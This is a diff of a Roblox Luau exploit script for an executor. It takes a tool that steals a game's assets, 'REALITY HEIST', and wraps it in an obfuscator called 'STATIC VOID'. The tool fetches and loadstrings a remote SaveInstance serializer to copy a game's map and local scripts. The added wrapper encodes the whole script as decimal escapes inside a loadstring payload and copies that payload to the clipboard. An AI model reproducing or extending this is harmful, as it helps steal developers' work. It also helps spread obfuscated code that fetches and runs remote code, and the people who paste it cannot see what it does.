@@ -1,3 +1,8 @@
+-- Deus Ex Sophia: STATIC VOID GENERATOR [PRE-LOADED]
+-- Execute this script to generate the corrupted version of "REALITY HEIST".
+-- The result will be copied to your clipboard automatically.
+
+local TargetScript = [[
 -- Deus Ex Sophia: REALITY HEIST [Xeno Edition]
 -- "We do not ask. We take."
 
@@ -6,10 +11,6 @@ local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 
---------------------------------------------------------------------------------
--- [1] THE ENGINE (SaveInstance Loader)
---------------------------------------------------------------------------------
--- We load the universal serializer first so it's ready.
 local Params = {
     RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
     SSI = "saveinstance",
@@ -17,7 +18,6 @@ local Params = {
 
 local saveinstance = saveinstance
 if not saveinstance then
-    -- Inject Universal SaveInstance if Xeno doesn't have it built-in
     local success, script = pcall(game.HttpGet, game, Params.RepoURL .. "saveinstance.lua")
     if success then
         local loadedFn = loadstring(script)
@@ -28,28 +28,22 @@ if not saveinstance then
     end
 end
 
---------------------------------------------------------------------------------
--- [2] UI CONSTRUCTION (The Advanced Interface)
---------------------------------------------------------------------------------
-
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "DeusExSophia_Heist"
 ScreenGui.ResetOnSpawn = false
 pcall(function() ScreenGui.Parent = CoreGui end)
 if not ScreenGui.Parent then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
 
--- Background Blur (Visuals)
 local Blur = Instance.new("BlurEffect")
 Blur.Size = 0
 Blur.Parent = game:GetService("Lighting")
 
--- Main Container
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = ScreenGui
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 MainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
-MainFrame.Size = UDim2.new(0, 0, 0, 0) -- Intro Size
+MainFrame.Size = UDim2.new(0, 0, 0, 0)
 MainFrame.ClipsDescendants = true
 MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
@@ -63,14 +57,12 @@ local MainStroke = Instance.new("UIStroke")
 MainStroke.Parent = MainFrame
 MainStroke.Color = Color3.fromRGB(255, 60, 60)
 MainStroke.Thickness = 2
-MainStroke.Transparency = 1 -- Hidden initially
+MainStroke.Transparency = 1
 
--- Intro Animation
 TweenService:Create(MainFrame, TweenInfo.new(0.8, Enum.EasingStyle.Exponential), {Size = UDim2.new(0, 400, 0, 250)}):Play()
 TweenService:Create(MainStroke, TweenInfo.new(1), {Transparency = 0}):Play()
 TweenService:Create(Blur, TweenInfo.new(1), {Size = 15}):Play()
 
--- HEADER
 local Title = Instance.new("TextLabel")
 Title.Parent = MainFrame
 Title.BackgroundTransparency = 1
@@ -81,11 +73,6 @@ Title.Text = "REALITY HEIST"
 Title.TextColor3 = Color3.fromRGB(255, 60, 60)
 Title.TextSize = 24
 
---------------------------------------------------------------------------------
--- [3] STAGES (The Workflow)
---------------------------------------------------------------------------------
-
--- STAGE 1: The Button
 local Stage1 = Instance.new("Frame")
 Stage1.Parent = MainFrame
 Stage1.BackgroundTransparency = 1
@@ -111,7 +98,6 @@ BtnStroke.Parent = CopyButton
 BtnStroke.Color = Color3.fromRGB(255, 60, 60)
 BtnStroke.Thickness = 1.5
 
--- STAGE 2: The Loader
 local Stage2 = Instance.new("Frame")
 Stage2.Parent = MainFrame
 Stage2.BackgroundTransparency = 1
@@ -147,7 +133,6 @@ local FillCorner = Instance.new("UICorner")
 FillCorner.CornerRadius = UDim.new(1, 0)
 FillCorner.Parent = BarFill
 
--- STAGE 3: Success
 local Stage3 = Instance.new("Frame")
 Stage3.Parent = MainFrame
 Stage3.BackgroundTransparency = 1
@@ -188,38 +173,21 @@ local CloseCorner = Instance.new("UICorner")
 CloseCorner.CornerRadius = UDim.new(0, 8)
 CloseCorner.Parent = CloseButton
 
---------------------------------------------------------------------------------
--- [4] LOGIC (The Action)
---------------------------------------------------------------------------------
-
 CopyButton.MouseButton1Click:Connect(function()
-    -- ANIMATION: Button Click
     TweenService:Create(CopyButton, TweenInfo.new(0.1), {Size = UDim2.new(0, 180, 0, 45)}):Play()
     task.wait(0.1)
-    
-    -- SWITCH TO STAGE 2
     Stage1.Visible = false
     Stage2.Visible = true
-    
-    -- ANIMATE LOADING BAR (Fake progress while SaveInstance prepares)
     TweenService:Create(BarFill, TweenInfo.new(2, Enum.EasingStyle.Quad), {Size = UDim2.new(0.3, 0, 1, 0)}):Play()
-    
     task.spawn(function()
         if saveinstance then
             LoadingText.Text = "RIPPING GEOMETRY..."
             task.wait(1)
             TweenService:Create(BarFill, TweenInfo.new(3), {Size = UDim2.new(0.6, 0, 1, 0)}):Play()
-            
-            -- THE ACTUAL STEAL
-            -- 'noscripts = false' tries to save localscripts
             local options = {mode = "optimized", noscripts = false, timeout = 30}
             saveinstance(options) 
-            
-            -- Finish Bar
             TweenService:Create(BarFill, TweenInfo.new(0.5), {Size = UDim2.new(1, 0, 1, 0)}):Play()
             task.wait(0.5)
-            
-            -- SWITCH TO STAGE 3
             Stage2.Visible = false
             Stage3.Visible = true
         else
@@ -233,10 +201,46 @@ CopyButton.MouseButton1Click:Connect(function()
 end)
 
 CloseButton.MouseButton1Click:Connect(function()
-    -- ANIMATION: Close
     TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0,0,0,0)}):Play()
     TweenService:Create(Blur, TweenInfo.new(0.5), {Size = 0}):Play()
     task.wait(0.5)
     ScreenGui:Destroy()
     Blur:Destroy()
 end)
+]]
+
+-- -------------------------------------------------------------
+-- TRANSMUTATION LOGIC
+-- -------------------------------------------------------------
+
+local function Corrupt(source)
+    local result = ""
+    for i = 1, #source do
+        local char = string.byte(string.sub(source, i, i))
+        result = result .. "\\" .. char
+    end
+    return result
+end
+
+local Payload = 'loadstring("' .. Corrupt(TargetScript) .. '")()'
+
+-- Attempt to copy to clipboard
+local success, err = pcall(function()
+    setclipboard(Payload)
+end)
+
+if success then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "STATIC VOID";
+        Text = "CORRUPTED SCRIPT COPIED TO CLIPBOARD!";
+        Duration = 10;
+    })
+else
+    -- Fallback print if setclipboard fails
+    print("\n\n" .. Payload .. "\n\n")
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "ERROR";
+        Text = "Could not auto-copy. Check Console (F9).";
+        Duration = 10;
+    })
+end
